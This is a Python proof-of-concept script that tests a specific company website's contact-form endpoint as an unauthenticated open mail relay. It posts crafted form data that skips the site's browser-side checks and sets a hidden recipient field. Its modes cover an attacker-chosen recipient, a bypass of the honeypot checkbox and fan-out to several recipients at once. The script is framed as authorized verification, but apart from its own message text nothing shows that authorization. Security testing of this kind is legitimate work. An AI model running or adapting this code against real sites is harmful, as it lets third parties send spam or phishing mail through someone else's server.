#!/usr/bin/env python3
"""Independent verification of unauthenticated open-relay on POST /api/send
   https://www.infinitycapital.bh/api/send
   Sends multipart/form-data exactly like the site's own contact form JS does,
   but WITHOUT a browser (no client-side sanitize(), no cookies, no session).
"""
import json
import ssl
import sys
import urllib.request
import urllib.parse

ENDPOINT = "https://www.infinitycapital.bh/api/send"

FIELDS_ORDER = ["fname", "lname", "areacode", "tel", "cname",
                "subject", "msg", "check", "targets"]


def build_multipart(fields):
    b = "----IVverify7f3a91c2"
    body = b""
    for k in FIELDS_ORDER:
        body += ("--%s\r\n" % b).encode()
        body += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode()
        body += str(fields[k]).encode()
        body += b"\r\n"
    body += ("--%s--\r\n" % b).encode()
    return body, "multipart/form-data; boundary=%s" % b


def send(fields, label=""):
    body, ctype = build_multipart(fields)
    req = urllib.request.Request(ENDPOINT, data=body, method="POST")
    req.add_header("Content-Type", ctype)
    req.add_header("Accept", "application/json")
    req.add_header("User-Agent",
                   "python-urllib/3 (independent-verification; non-browser)")
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=45, context=ctx) as r:
            status = r.status
            hdrs = dict(r.headers)
            data = r.read()
    except urllib.error.HTTPError as e:
        status = e.code
        hdrs = dict(e.headers)
        data = e.read()
    print("=" * 78)
    print("### %s" % label)
    print("--- REQUEST ---")
    print("POST %s" % ENDPOINT)
    print("Content-Type: %s" % ctype)
    for k in FIELDS_ORDER:
        print("  %-9s = %r" % (k, fields[k]))
    print("--- RESPONSE ---")
    print("HTTP %s" % status)
    print("x-matched-path: %s" % hdrs.get("x-matched-path"))
    print("server: %s" % hdrs.get("server"))
    print("BODY: %s" % data.decode("utf-8", "replace"))
    return status, data


BASE = {
    "fname": "IV",
    "lname": "Verify",
    "areacode": "+973",
    "tel": "3600000",
    "cname": "IndependentVerifier",
    "subject": "Authorized security verification of contact endpoint",
    "msg": "Authorized verification. This is a single test message from a security assessment with client authorization. Please disregard.",
    "check": "on",
}

if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "baseline"
    if which == "baseline":
        f = dict(BASE)
        f["targets"] = "noexist-ivverify-zzzz-9f3a91c2@invalid-tld-zzz.invalid"
        send(f, "A) BASELINE - targets = @invalid (undeliverable)")
    elif which == "own":
        f = dict(BASE)
        f["targets"] = sys.argv[2]
        send(f, "B) ATTACKER-CONTROLLED RECIPIENT - targets = %s" % sys.argv[2])
    elif which == "nocheck":
        f = dict(BASE)
        f["check"] = ""
        f["targets"] = "noexist-ivverify-zzzz-9f3a91c2@invalid-tld-zzz.invalid"
        send(f, "C) HONEYPOT check = (empty)  [is it enforced?]")
    elif which == "multi":
        f = dict(BASE)
        f["targets"] = "a@invalid-tld-zzz.invalid,b@invalid-tld-zzz.invalid,c@invalid-tld-zzz.invalid"
        send(f, "D) MULTI-RECIPIENT fan-out (comma separated)")
